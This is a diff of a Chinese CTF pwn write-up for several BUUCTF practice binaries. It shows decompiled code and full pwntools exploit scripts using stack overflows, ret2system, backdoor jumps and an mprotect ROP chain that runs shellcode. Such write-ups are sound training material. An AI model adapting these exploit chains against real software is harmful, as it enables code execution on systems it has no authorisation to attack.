@@ -398,10 +398,6 @@ v2 = sub_804871F(buf);
 
 即：\x00 + 0xff  \* 7
 
-
-
-
-
 exp1：leak read
 
 ```python
@@ -511,8 +507,6 @@ io.sendline(str(0x1111))
 io.interactive()
 ```
 
-
-
 ```
 $ cat flag
 [DEBUG] Sent 0x9 bytes:
@@ -522,7 +516,7 @@ $ cat flag
 flag{18b6ca26-1d7d-407b-8b08-63dd66d4e775}
 ```
 
-## 0x9.get_started_3dsctf_2016
+## 0xA.get_started_3dsctf_2016
 
 ```
 gwt@ubuntu:~/Desktop$ checksec  get_started_3dsctf_2016 
@@ -536,9 +530,11 @@ gwt@ubuntu:~/Desktop$ file get_started_3dsctf_2016
 get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
 ```
 
+两个有用的函数：
+
 main中：
 
-```
+```c
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
   char v4[56]; // [esp+4h] [ebp-38h] BYREF
@@ -551,7 +547,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 还有个get_flag：
 
-```
+```c
 void __cdecl get_flag(int a1, int a2)
 {
   int v2; // esi
@@ -581,6 +577,21 @@ void __cdecl get_flag(int a1, int a2)
 
 ### 方法一：
 
+本地不能通，看了国外的wp，应该是buu的问题
+
+绕过if判断，直接到flag
+
+```
+from pwn import*
+
+p=process('./get_started_3dsctf_2016')
+payload='a'*0x38+p32(0x80489bb)
+p.sendline(payload)
+p.interactive()
+```
+
+或者
+
 ```Python
 from pwn import *
 q = remote('node3.buuoj.cn',29154)
@@ -599,18 +610,93 @@ sleep(0.1)
 q.recv()
 ```
 
-### 方法二：（未完成）
+### 方法二：修改内存段的权限
 
 mprotect函数，可以修改内存段的权限
 
-```
+```c
 int mprotect(void *addr, size_t len, int prot);
 addr 内存启始地址
 len  修改内存的长度
 prot 内存的权限
 ```
 
-## 0xA.ciscn_2019_en_2
+```
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+ 0x8048000  0x80ea000 r-xp    a2000 0      /home/gwt/Desktop/get_started_3dsctf_2016
+ 0x80ea000  0x80ec000 rw-p     2000 a1000  /home/gwt/Desktop/get_started_3dsctf_2016
+ 0x80ec000  0x80ed000 rw-p     1000 0      
+ 0x844a000  0x846c000 rw-p    22000 0      [heap]
+0xf7ff6000 0xf7ff9000 r--p     3000 0      [vvar]
+0xf7ff9000 0xf7ffb000 r-xp     2000 0      [vdso]
+0xff9ba000 0xff9db000 rw-p    21000 0      [stack]
+```
+
+思路：
+
+ ```text
+ 栈溢出到mprotect函数（call==push+jmp）
+ 所以ret后要留一个返回地址，因为ret就相当于jmp到mprotect。
+ payload大致为：
+ payload = 'a'*0x38+p32(mprotect_add)+p32(ret_add)
+ payload+=p32(argu1) + p32(argu2) +p32 (argu3)
+ 第一个参数是被修改内存的地址：0x80ea000
+ 第二个参数是被修改内存的大小：必须是页的整数倍，0x1000
+ 第三参数值权限：0x7
+ 然后找个pop来平衡堆栈：
+ ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret'
+ 因为是3个参数，就找3个pop
+ 现在payload：
+ payload = 'a' + 0x38 + p32(mprotect_addr)
+ payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)
+ payload += p32(ret_addr2)
+ 
+ ret_addr2是read函数的地址，将shellcode写入内存。
+ read函数原型：
+ ssize_t read(int fd, void *buf, size_t count);
+ fd 设为0时就可以从输入端读取内容
+ buf 设为我们想要执行的内存地址    
+ size 适当大小，足够写入shellcode就OK
+ ```
+
+​    完整exp：
+
+```python
+from pwn import *
+elf = ELF('./get_started_3dsctf_2016')
+r = process('./get_started_3dsctf_2016')
+pop3_ret = 0x804951D
+mem_addr = 0x80ec000 
+mem_size = 0x1000    
+mem_proc = 0x7       
+
+mprotect_addr = elf.symbols['mprotect']
+read_addr = elf.symbols['read']
+
+
+payload  = 'A' * 0x38
+payload += p32(mprotect_addr)
+payload += p32(pop3_ret) 
+payload += p32(mem_addr) 
+payload += p32(mem_size)  
+payload += p32(mem_proc)   
+payload += p32(read_addr)
+payload += p32(pop3_ret)  
+payload += p32(0)     
+payload += p32(mem_addr)   
+payload += p32(0x100) 
+payload += p32(mem_addr) 
+
+r.sendline(payload)
+payload = asm(shellcraft.sh()) 
+r.sendline(payload)
+r.interactive()
+```
+
+
+
+## 0xB.ciscn_2019_en_2
 
 ret2libc.
 
@@ -653,5 +739,229 @@ io.sendline(payload)
 io.interactive()
 
 #gdb.attach(io)
+```
+
+## 0xC.jarvisoj_level2
+
+```
+gwt@ubuntu:~/Desktop$ file level2 
+level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped
+
+gwt@ubuntu:~/Desktop$  checksec level2 
+[*] '/home/gwt/Desktop/level2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+没后门函数，重要的部分：
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+0h] [ebp-88h] BYREF
+  system("echo Input:");
+  return read(0, buf, 0x100u);
+}
+```
+
+有/bin/sh字符串。而且没开PIE，字符串的地址不会变
+
+```python 
+from pwn import *
+context(log_level='DEBUG')
+elf = ELF("./level2")
+#io = process("./level2")
+#node3.buuoj.cn:28929
+io = remote('node3.buuoj.cn',28929)
+sys_plt = elf.plt['system']
+#bin_sh = 0x0804A024
+bin_sh = next(elf.search('/bin/sh'))
+payload = 'a'*140 +p32(sys_plt)+p32(0xdeadbeef)+p32(bin_sh)
+io.recv()
+io.sendline(payload)
+io.interactive()
+```
+
+## 0xD.ciscn_2019_n_8
+
+```
+yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_8
+[*] '/home/yutao/Desktop/ciscn_2019_n_8'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp-14h] [ebp-20h]
+  int v5; // [esp-10h] [ebp-1Ch]
+
+  var[13] = 0;
+  var[14] = 0;
+  init();
+  puts("What's your name?");
+  __isoc99_scanf("%s", var, v4, v5);
+  if ( *&var[13] )
+  {
+    if ( *&var[13] == 17LL )
+      system("/bin/sh");
+    else
+      printf(
+        "something wrong! val is %d",
+        var[0],
+        var[1],
+        var[2],
+        var[3],
+        var[4],
+        var[5],
+        var[6],
+        var[7],
+        var[8],
+        var[9],
+        var[10],
+        var[11],
+        var[12],
+        var[13],
+        var[14]);
+  }
+  else
+  {
+    printf("%s, Welcome!\n", var);
+    puts("Try do something~");
+  }
+  return 0;
+}
+```
+
+所以payload：
+
+```python
+from pwn import *
+context(log_level='DEBUG')
+#io = process("./ciscn_2019_n_8")
+io = remote('node3.buuoj.cn',29560 )
+io.recv() 
+payload = p32(17) * 14
+io.sendline(payload)
+io.interactive()
+```
+
+## 0xE.not_the_same_3dsctf_2016
+
+就两个有用的函数：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF
+
+  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");
+  gets(v4);
+  return 0;
+}
+int get_secret()
+{
+  int v0; // esi
+
+  v0 = fopen("flag.txt", &unk_80CF91B);
+  fgets(&fl4g, 45, v0);
+  return fclose(v0);
+}
+```
+
+和get_started_3dsctf_2016一样，用mprotect修改内存的权限。
+
+```python
+from pwn import *
+elf = ELF('./not_the_same_3dsctf_2016')
+#r = process('./not_the_same_3dsctf_2016')
+io=remote('node3.buuoj.cn',29052)
+pop_ret = 0x08050b45
+#pop ebx ; pop esi ; pop edi ; ret
+mem_addr = 0x80ec000 
+mem_size = 0x1000    
+mem_proc = 0x7       
+mprotect_addr = elf.symbols['mprotect']
+read_addr = elf.symbols['read']
+payload  = 'A' * 0x2d
+payload += p32(mprotect_addr)
+payload += p32(pop_ret) 
+payload += p32(mem_addr) 
+payload += p32(mem_size)  
+payload += p32(mem_proc)   
+payload += p32(read_addr)
+payload += p32(pop_ret)  
+payload += p32(0)     
+payload += p32(mem_addr)   
+payload += p32(0x100) 
+payload += p32(mem_addr)   
+io.sendline(payload)
+payload = asm(shellcraft.sh()) 
+io.sendline(payload)
+io.interactive()
+```
+
+
+
+## 0xF.bjdctf_2020_babystack
+
+有个后门函数。主程序：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
+  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  LODWORD(nbytes) = 0;
+  puts("**********************************");
+  puts("*     Welcome to the BJDCTF!     *");
+  puts("* And Welcome to the bin world!  *");
+  puts("*  Let's try to pwn the world!   *");
+  puts("* Please told me u answer loudly!*");
+  puts("[+]Are u ready?");
+  puts("[+]Please input the length of your name:");
+  __isoc99_scanf("%d", &nbytes);
+  puts("[+]What's u name?");
+  read(0, buf, (unsigned int)nbytes);
+  return 0;
+}
+```
+
+```
+-0000000000000010 buf             db 12 dup(?)
+-0000000000000004 nbytes          dq ?
++0000000000000004                 db ? ; undefined
++0000000000000005                 db ? ; undefined
++0000000000000006                 db ? ; undefined
++0000000000000007                 db ? ; undefined
++0000000000000008  r              db 8 dup(?)
+```
+
+这个题，两个思路吧（其实是一样的），一个就是将输入的nbytes开大一点，直接可以覆盖到返回地址。
+
+或者就是整数溢出，根据size_t与unsigned int的不同来做（其实也是将nbytes(buf)开的很大，覆盖返回地址）。
+
+```python
+from pwn import *
+#io = process("./bjdctf_2020_babystack")
+io = remote('node3.buuoj.cn',26217)
+context(log_level='DEBUG')
+io.recv()
+back_door = 0x004006E6 
+io.sendline("100")#或者这里改为-1
+io.recv()
+payload = 'a'*0x18+p64(back_door)+p64(0xdeadbeef)
+io.sendline(payload)
+io.interactive()
 ```
 
